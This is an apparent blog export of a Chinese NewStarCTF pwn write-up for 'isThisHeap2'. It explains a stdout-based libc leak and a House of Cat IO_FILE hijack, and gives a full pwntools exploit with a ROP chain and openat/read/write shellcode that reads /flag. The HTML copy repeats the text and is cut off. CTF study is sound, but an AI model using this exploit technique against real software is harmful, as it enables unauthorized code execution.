KILL\n```\n\n其中ban掉open、execve是比较麻烦的。\n\n程序有个菜单，有add、delete、edit、show、exit五个功能，但实际上delete和show都没有实现。\n\n在add中最多可以同时存在16个chunk，malloc长度固定为0x200。\n\n在edit中同样存在下标越界漏洞，没有检查idx是否<0，会从heaps+idx*0x8的位置取出一个指针，并向指针指向的位置写入0x200字节的内容。heaps在0x202060，而在0x202008处有一个**dso_handle指向自己，可以修改dso_handle获得一个任意写，偏移为-11**。\n\n然而这里因为开了RELRO，应该是写不了GOT表了，并且由于没有了show，要leak libc也没那么容易了。\n\n**不过stdin、stdout、stderr的指针就在heaps前面，这里可以直接通过edit取出他们的指针并对他们进行修改。**\n\nstdout、stdin、stderr的偏移是-8、-6、-4。\n\n这题是对IO_FILE的利用，可以通过edit的漏洞直接对stdin、stdout、stderr进行操作，可以影响文件流的操作。\n\n泄露libc可以通过修改stdout的`_flag`字段和`_IO_write_base`字段进行泄露。puts函数最后对调用到stdout的vtable的`_xsputn()`，通过IO_FILE中的指针指定输出内容的位置。修改对应指针内容就可以改变输出的位置，从而泄露信息，之后debug调一下就能找到libc中地址的位置，从而泄露出libc。\n\n```py\npayload=p64(0xfbad1800) + p64(0)*3 + '\\x00' \n# flag + _IO_read_ptr + _IO_read_end + _IO_read_base + _IO_write_base(只改了低字节)\n```\n\n后面get shell就有些麻烦了，官方的WP是走的House of apple2或House of cat打puts劫持程序流，之后用mprotect分配可读可写可执行的空间之后写shellcode走orw（open被ban了只能走openat）。\n\n看网上有走rop的orw（open被ban了只能走openat），通过修改stdin劫持scanf将rop链写到main的返回地址，并在写完后再写一次将scanf的返回地址覆盖为`leave;ret;`跳出到main结束，最后main返回调用rop链。\n\n先按照官方的WP走，House of apple2和House of cat都是对**_IO_wfile_jumps**中的函数进行攻击，官方的wp走的好像是`House of Cat`。\n\n首先利用`stdout`泄露`libc`，之后便修改`stdout`走`House of Cat`，伪造`vtable`时修改为`_IO_wfile_jumps`，并通过偏移将`xsputn`修改为`seekoff`，伪造`wide_data->vtable`时将`_IO_WOVERFLOW`修改为`set_context+61`，后面调用`puts`就会一路走到`set_context+61`，设置各个寄存器，劫持rip执行read输入数据，同时也要劫持rsp和read的地址使得输入的数据能够栈溢出，之后通过栈溢出走rop链调用`mprotect`修改写入数据位置为`rwx`，之后调用写入的`shellcode`执行`orw`。\n\n官方wp：\n\n```py\n#!/usr/bin/env python2\n# -*- coding: utf-8 -*\nfrom pwn import *\n\nse      = lambda data               :p.send(data) \nsa      = lambda delim,data         :p.sendafter(delim, data)\nsl      = lambda data               :p.sendline(data)\nsla     = lambda delim,data         :p.sendlineafter(delim, data)\nsea     = lambda delim,data         :p.sendafter(delim, data)\nrc      = lambda numb=4096          :p.recv(numb)\nru      = lambda delims, drop=True  :p.recvuntil(delims, drop)\nuu32    = lambda data               :u32(data.ljust(4, '\\0'))\nuu64    = lambda data               :u64(data.ljust(8, '\\0'))\n\n\nelf = ELF('./pwn')\ncontext(arch = elf.arch, os = 'linux',log_level = 'debug')\n# p = process('./pwn')\np = remote(\"node4.buuoj.cn\",28657)\n\ndef edit(idx,data):\n    sla(\">> \",str(3))\n    sla(\"Index\",str(idx))\n    sea(\"Content\",str(data))\n\nedit(-8,p64(0xfbad1800)+p64(0)*3+'\\x00')\nlibc_leak = uu64(ru('\\x7f',drop=False)[-6:])\nlibc_base = libc_leak - 0x1ec980\n\nlibc = ELF('./libc-2.31.so')\nlibc.address = libc_base\nsystem_addr = libc.sym.system\nbin_sh = libc.search('/bin/sh').next()\nmagic = libc.sym.setcontext + 61\n\nrdx = 0x0000000000142c92 + libc_base\nrdi = 0x0000000000023b6a + libc_base\nrsi = 0x000000000002601f + libc_base\n\n_IO_wfile_jumps = libc_base + 0x1e8f60\ntarget = libc_base + 0x1ed6a0 # _IO_2_1_stdout_\naddr = target&(~0xfff)\nfuck_frame = SigreturnFrame()\nfuck_frame.rdi = 0\nfuck_frame.rsi = addr\nfuck_frame.rdx = 0x300\nfuck_frame.rsp = addr\nfuck_frame.rip = libc.sym.read\nfuck_io = p64(0)*5 + p64(1) + p64((((((target+0x100)>>32)-1))<<32)+((target+0x100)&0xffffffff)) + p64(3) + p64(4)\n# p64(1)后的那个地址指向fuck_frame，后面set_context会将这个地址设置为rdx，并以其为基准将fuck_frame的值赋给寄存器\nfuck_io = fuck_io.ljust(0x88,'\\0')\nfuck_io += p64(target+0x30)\nfuck_io = fuck_io.ljust(0xa0,'\\0')\nfuck_io += p64(target+0x10)   # wide_data\nfuck_io = fuck_io.ljust(0xd8,'\\0')\nfuck_io += p64(_IO_wfile_jumps + 0x10) # vtable 通过偏移将xsputn改为seekoff\nfuck_io += p64(0) + p64(magic) + p64(target+0xe8-0x18) + p64(0) # magic覆盖了wide_data的vtable中的_IO_WOVERFLOW\nfuck_io += str(fuck_frame)\n\nedit(-8,fuck_io)\n\nsleep(0.1)\nse(p64(rdi)+p64(addr)+p64(rsi)+p64(0x1000)+p64(rdx)+p64(7)+p64(libc.sym.mprotect)+p64(addr+0x40)+asm('lea rbp,[rsp+0x200];'+shellcraft.openat(0,\"/flag\",0)+shellcraft.read('rax','rbp',0x100)+shellcraft.write(1,'rbp',0x100)+shellcraft.exit(0)))\n\np.interactive()\n```\n\n\n\n\n\n\n\n","slug":"IsThisHeap2","published":1,"updated":"2023-01-13T05:51:52.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czaf6000p5oud81jtcfn5","content":"<p>NewStarCTF，看起来是堆题实际上是对IO_FILE的利用。</p>\n<span id=\"more\"></span>\n\n<p>查壳，啥都开了，就像真的堆题一样</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/alphonse/CTF_GAME/new_star/isThisHeap2/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n\n<p>而且还开了沙箱</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">=================================</span><br><span class=\"line\"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class=\"built_in\">arch</span></span><br><span class=\"line\"> 0001: 0x15 0x00 0x0a 0xc000003e  <span class=\"keyword\">if</span> (A != ARCH_X86_64) goto 0012</span><br><span class=\"line\"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class=\"line\"> 0003: 0x35 0x08 0x00 0x40000000  <span class=\"keyword\">if</span> (A &gt;= 0x40000000) goto 0012</span><br><span class=\"line\"> 0004: 0x15 0x07 0x00 0x00000002  <span class=\"keyword\">if</span> (A == open) goto 0012</span><br><span class=\"line\"> 0005: 0x15 0x06 0x00 0x0000009d  <span class=\"keyword\">if</span> (A == prctl) goto 0012</span><br><span class=\"line\"> 0006: 0x15 0x05 0x00 0x00000039  <span class=\"keyword\">if</span> (A == fork) goto 0012</span><br><span class=\"line\"> 0007: 0x15 0x04 0x00 0x0000003a  <span class=\"keyword\">if</span> (A == vfork) goto 0012</span><br><span class=\"line\"> 0008: 0x15 0x03 0x00 0x0000003b  <span class=\"keyword\">if</span> (A == execve) goto 0012</span><br><span class=\"line\"> 0009: 0x15 0x02 0x00 0x00000065  <span class=\"keyword\">if</span> (A == ptrace) goto 0012</span><br><span class=\"line\"> 0010: 0x15 0x01 0x00 0x00000142  <span class=\"keyword\">if</span> (A == execveat) goto 0012</span><br><span class=\"line\"> 0011: 0x06 0x00 0x00 0x7fff0000  <span class=\"built_in\">return</span> ALLOW</span><br><span class=\"line\"> 0012: 0x06 0x00 0x00 0x00000000  <span class=\"built_in\">return</span> KILL</span><br></pre></td></tr></table></figure>\n\n<p>其中ban掉open、execve是比较麻烦的。</p>\n<p>程序有个菜单，有add、delete、edit、show、exit五个功能，但实际上delete和show都没有实现。</p>\n<p>在add中最多可以同时存在16个chunk，malloc长度固定为0x200。</p>\n<p>在edit中同样存在下标越界漏洞，没有检查idx是否&lt;0，会从heaps+idx*0x8的位置取出一个指针，并向指针指向的位置写入0x200字节的内容。heaps在0x202060，而在0x202008处有一个<strong>dso_handle指向自己，可以修改dso_handle获得一个任意写，偏移为-11</strong>。</p>\n<p>然而这里因为开了RELRO，应该是写不了GOT表了，并且由于没有了show，要leak libc也没那么容易了。</p>\n<p><strong>不过stdin、stdout、stderr的指针就在heaps前面，这里可以直接通过edit取出他们的指针并对他们进行修改。</strong></p>\n<p>stdout、stdin、stderr的偏移是-8、-6、-4。</p>\n<p>这题是对IO_FILE的利用，可以通过edit的漏洞直接对stdin、stdout、stderr进行操作，可以影响文件流的操作。</p>\n<p>泄露libc可以通过修改stdout的<code>_flag</code>字段和<code>_IO_write_base</code>字段进行泄露。puts函数最后对调用到stdout的vtable的<code>_xsputn()</code>，通过IO_FILE中的指针指定输出内容的位置。修改对应指针内容就可以改变输出的位置，从而泄露信息，之后debug调一下就能找到libc中地址的位置，从而泄露出libc。</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload=p64(<span class=\"number\">0xfbad1800</span>) + p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + <span class=\"string\">&#x27;\\x00&#x27;</span> </span><br><span class=\"line\"><span class=\"comment\"># flag + _IO_read_ptr + _IO_read_end + _IO_read_base + _IO_write_base(只改了低字节)</span></span><br></pre></td></tr></table></figure>\n\n<p>后面get shell就有些麻烦了，官方的WP是走的House of apple2或House of cat打puts劫持程序流，之后用mprotect分配可读可写可执行的空间之后写shellcode走orw（open被ban了只能走openat）。</p>\n<p>看网上有走rop的orw（open被ban了只能走openat），通过修改stdin劫持scanf将rop链写到main的返回地址，并在写完后再写一次将scanf的返回地址覆盖为<code>leave;ret;</code>跳出到main结束，最后main返回调用rop链。</p>\n<p>先按照官方的WP走，House of apple2和House of cat都是对**_IO_wfile_jumps**中的函数进行攻击，官方的wp走的好像是<code>House of Cat</code>。</p>\n<p>首先利用<code>stdout</code>泄露<code>libc</code>，之后便修改<code>stdout</code>走<code>House of Cat</code>，伪造<code>vtable</code>时修改为<code>_IO_wfile_jumps</code>，并通过偏移将<code>xsputn</code>修改为<code>seekoff</code>，伪造<code>wide_data-&gt;vtable</code>时将<code>_IO_WOVERFLOW</code>修改为<code>set_context+61</code>，后面调用<code>puts</code>就会一路走到<code>set_context+61</code>，设置各个寄存器，劫持rip执行read输入数据，同时也要劫持rsp和read的地址使得输入的数据能够栈溢出，之后通过栈溢出走rop链调用<code>mprotect</code>修改写入数据位置为<code>rwx</code>，之后调用写入的<code>shellcode</code>执行<code>orw</code>。</p>\n<p>官方wp：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python2</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">se      = <span class=\"keyword\">lambda</span> data               :p.send(data) </span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class=\"line\">sea     = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">rc      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">context(arch = elf.arch, os = <span class=\"string\">&#x27;linux&#x27;</span>,log_level = <span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"number\">28657</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,data</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;&gt;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">    sla(<span class=\"string\">&quot;Index&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    sea(<span class=\"string\">&quot;Content&quot;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\"></span><br><span class=\"line\">edit(-<span class=\"number\">8</span>,p64(<span class=\"number\">0xfbad1800</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">libc_leak = uu64(ru(<span class=\"string\">&#x27;\\x7f&#x27;</span>,drop=<span class=\"literal\">False</span>)[-<span class=\"number\">6</span>:])</span><br><span class=\"line\">libc_base = libc_leak - <span class=\"number\">0x1ec980</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\">system_addr = libc.sym.system</span><br><span class=\"line\">bin_sh = libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).<span class=\"built_in\">next</span>()</span><br><span class=\"line\">magic = libc.sym.setcontext + <span class=\"number\">61</span></span><br><span class=\"line\"></span><br><span class=\"line\">rdx = <span class=\"number\">0x0000000000142c92</span> + libc_base</span><br><span class=\"line\">rdi = <span class=\"number\">0x0000000000023b6a</span> + libc_base</span><br><span class=\"line\">rsi = <span class=\"number\">0x000000000002601f</span> + libc_base</span><br><span class=\"line\"></span><br><span class=\"line\">_IO_wfile_jumps = libc_base + <span class=\"number\">0x1e8f60</span></span><br><span class=\"line\">target = libc_base + <span class=\"number\">0x1ed6a0</span> <span class=\"comment\"># _IO_2_1_stdout_</span></span><br><span class=\"line\">addr = target&amp;(~<span class=\"number\">0xfff</span>)</span><br><span class=\"line\">fuck_frame = SigreturnFrame()</span><br><span class=\"line\">fuck_frame.rdi = <span class=\"number\">0</span></span><br><span class=\"line\">fuck_frame.rsi = addr</span><br><span class=\"line\">fuck_frame.rdx = <span class=\"number\">0x300</span></span><br><span class=\"line\">fuck_frame.rsp = addr</span><br><span class=\"line\">fuck_frame.rip = libc.sym.read</span><br><span class=\"line\">fuck_io = p64(<span class=\"number\">0</span>)*<span class=\"number\">5</span> + p64(<span class=\"number\">1</span>) + p64((((((target+<span class=\"number\">0x100</span>)&gt;&gt;<span class=\"number\">32</span>)-<span class=\"number\">1</span>))&lt;&lt;<span class=\"number\">32</span>)+((target+<span class=\"number\">0x100</span>)&amp;<span class=\"number\">0xffffffff</span>)) + p64(<span class=\"number\">3</span>) + p64(<span class=\"number\">4</span>)</span><br><span class=\"line\"><span class=\"comment\"># p64(1)后的那个地址指向fuck_frame，后面set_context会将这个地址设置为rdx，并以其为基准将fuck_frame的值赋给寄存器</span></span><br><span class=\"line\">fuck_io = fuck_io.ljust(<span class=\"number\">0x88</span>,<span class=\"string\">&#x27;\\0&#x27;</span>)</span><br><span class=\"line\">fuck_io += p64(target+<span class=\"number\">0x30</span>)</span><br><span class=\"line\">fuck_io = fuck_io.ljust(<span class=\"number\">0xa0</span>,<span class=\"string\">&#x27;\\0&#x27;</span>)</span><br><span class=\"line\">fuck_io += p64(target+<span class=\"number\">0x10</span>)   <span class=\"comment\"># wide_data</span></span><br><span class=\"line\">fuck_io = fuck_io.ljust(<span class=\"number\">0xd8</span>,<span class=\"string\">&#x27;\\0&#x27;</span>)</span><br><span class=\"line\">fuck_io += p64(_IO_wfile_jumps + <span class=\"number\">0x10</span>) <span class=\"comment\"># vtable 通过偏移将xsputn改为seekoff</span></span><br><span class=\"line\">fuck_io += p64(<span class=\"number\">0</span>) + p64(magic) + p64(target+<span class=\"number\">0xe8</span>-<span class=\"number\">0x18</span>) + p64(<span class=\"number\">0</span>) <span class=\"comment\"># magic覆盖了wide_data的vtable中的_IO_WOVERFLOW</span></span><br><span class=\"line\">fuck_io += <span class=\"built_in\">str</span>(fuck_frame)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(-<span class=\"number\">8</span>,fuck_io)</span><br><span class=\"line\"></span><br><span class=\"line\">sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">se(p64(rdi)+p64(addr)+p64(rsi)+p64(<span class=\"number\">0x1000</span>)+p64(rdx)+p64(<span class=\"number\">7</span>)+p64(libc.sym.mprotect)+p64(addr+<span class=\"number\">0x40</span>)+asm(<span class=\"string\">&#x27;lea rbp,[rsp+0x200];&#x27;</span>+shellcraft.openat(<span class=\"number\">0</span>,<span class=\"string\">&quot;/flag&quot;</span>,<span class=\"number\">0</span>)+shellcraft.read(<span class=\"string\">&#x27;rax&#x27;</span>,<span class=\"string\">&#x27;rbp&#x27;</span>,<span class=\"number\">0x100</span>)+shellcraft.write(<span class=\"number\">1</span>,<span class=\"string\">&#x27;rbp&#x27;</span>,<span class=\"number\">0x100</span>)+shellcraft.exit(<span class=\"number\">0</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n","site":{"data":{}},"excerpt":"<p>NewStarCTF，看起来是堆题实际上是对IO_FILE的利用。</p>","more":"<p>查壳，啥都开了，就像真的堆题一样</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/alphonse/CTF_GAME/new_star/isThisHeap2/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n\n<p>而且还开了沙箱</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">=================================</span><br><span class=\"line\"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class=\"built_in\">arch</span></span><br><span class=\"line\"> 0001: 0x15 0x00 0x0a 0xc000003e  <span class=\"keyword\">if</span> (A != ARCH_X86_64) goto 0012</span><br><span class=\"line\"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class=\"line\"> 0003: 0x35 0x08 0x00 0x40000000  <span class=\"keyword\">if</span> (A &gt;= 0x40000000) goto 0012</span><br><span class=\"line\"> 0004: 0x15 0x07 0x00 0x00000002  <span class=\"keyword\">if</span> (A == open) goto 0012</span><br><span class=\"line\"> 0005: 0x15 0x06 0x00 0x0000009d  <span class=\"keyword\">if</span> (A == prctl) goto 0012</span><br><span class=\"line\"> 0006: 0x15 0x05 0x00 0x00000039  <span class=\"keyword\">if</span> (A == fork) goto 0012</span><br><span class=\"line\"> 0007: 0x15 0x04 0x00 0x0000003a  <span class=\"keyword\">if</span> (A == vfork) goto 0012</span><br><span class=\"line\"> 0008: 0x15 0x03 0x00 0x0000003b  <span class=\"keyword\">if</span> (A == execve) goto 0012</span><br><span class=\"line\"> 0009: 0x15 0x02 0x00 0x00000065  <span class=\"keyword\">if</span> (A == ptrace) goto 0012</span><br><span class=\"line\"> 0010: 0x15 0x01 0x00 0x00000142  <span class=\"keyword\">if</span> (A == execveat) goto 0012</span><br><span class=\"line\"> 0011: 0x06 0x00 0x00 0x7fff0000  <span class=\"built_in\">return</span> ALLOW</span><br><span class=\"line\"> 0012: 0x06 0x00 0x00 0x00000000  <span class=\"built_in\">return</span> KILL</span><br></pre></td></tr></table></figure>\n\n<p>其中ban掉open、execve是比较麻烦的。</p>\n<p>程序有个菜单，有add、delete、edit、show、exit五个功能，但实际上delete和show都没有实现。</p>\n<p>在add中最多可以同时存在16个chunk，malloc长度固定为0x200。</p>\n<p>在edit中同样存在下标越界漏洞，没有检查idx是否&lt;0，会从heaps+idx*0x8的位置取出一个指针，并向指针指向的位置写入0x200字节的内容。heaps在0x202060，而在0x202008处有一个<strong>dso_handle指向自己，可以修改dso_handle获得一个任意写，偏移为-11</strong>。</p>\n<p>然而这里因为开了RELRO，应该是写不了GOT表了，并且由于没有了show，要leak libc也没那么容易了。</p>\n<p><strong>不过stdin、stdout、stderr的指针就在heaps前面，这里可以直接通过edit取出他们的指针并对他们进行修改。</strong></p>\n<p>stdout、stdin、stderr的偏移是-8、-6、-4。</p>\n<p>这题是对IO_FILE的利用，可以通过edit的漏洞直接对stdin、stdout、stderr进行操作，可以影响文件流的操作。</p>\n<p>泄露libc可以通过修改stdout的<code>_flag</code>字段和<code>_IO_write_base</code>字段进行泄露。puts函数最后对调用到stdout的vtable的<code>_xsputn()</code>，通过IO_FILE中的指针指定输出内容的位置。修改对应指针内容就可以改变输出的位置，从而泄露信息，之后debug调一下就能找到libc中地址的位置，从而泄露出libc。</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload=p64(<span class=\"number\">0xfbad1800</span>) + p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + <span class=\"string\">&#x27;\\x00&#x27;</span> </span><br><span class=\"line\"><span class=\"comment\"># flag + _IO_read_ptr + _IO_read_end + _IO_read_base + _IO_write_base(只改了低字节)</span></span><br></pre></td></tr></table></figure>\n\n<p>后面get shell就有些麻烦了，官方的WP是走的House of apple2或House of cat打puts劫持程序流，之后用mprotect分配可读可写可执行的空间之后写shellcode走orw（open被ban了只能走openat）。</p>\n<p>看网上有走rop的orw（open被ban了只能走openat），通过修改stdin劫持scanf将rop链写到main的返回地址，并在写完后再写一次将scanf的返回地址覆盖为<code>leave;ret;</code>跳出到main结束，最后main返回调用rop链。</p>\n<p>先按照官方的WP走，House of apple2和House of cat都是对**_IO_wfile_jumps**中的函数进行攻击，官方的wp走的好像是<code>House of Cat</code>。</p>\n<p>首先利用<code>stdout</code>泄露<code>libc</code>，之后便修改<code>stdout</code>走<code>House of Cat</code>，伪造<code>vtable</code>时修改为<code>_IO_wfile_jumps</code>，并通过偏移将<code>xsputn</code>修改为<code>seekoff</code>，伪造<code>wide_data-&gt;vtable</code>时将<code>_IO_WOVERFLOW</code>修改为<code>set_context+61</code>，后面调用<code>puts</code>就会一路走到<code>set_context+61</code>，设置各个寄存器，劫持rip执行read输入数据，同时也要劫持rsp和read的地址使得输入的数据能够栈溢出，之后通过栈溢出走rop链调用<code>mprotect</code>修改写入数据位置为<code>rwx</code>，之后调用写入的<code>shellcode</code>执行<code>orw</code>。</p>\n<p>官方wp：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python2</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">se      = <span class=\"keyword\">lambda</span> data               :p.send(data) </span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class=\"line\">sea     = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">rc      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span 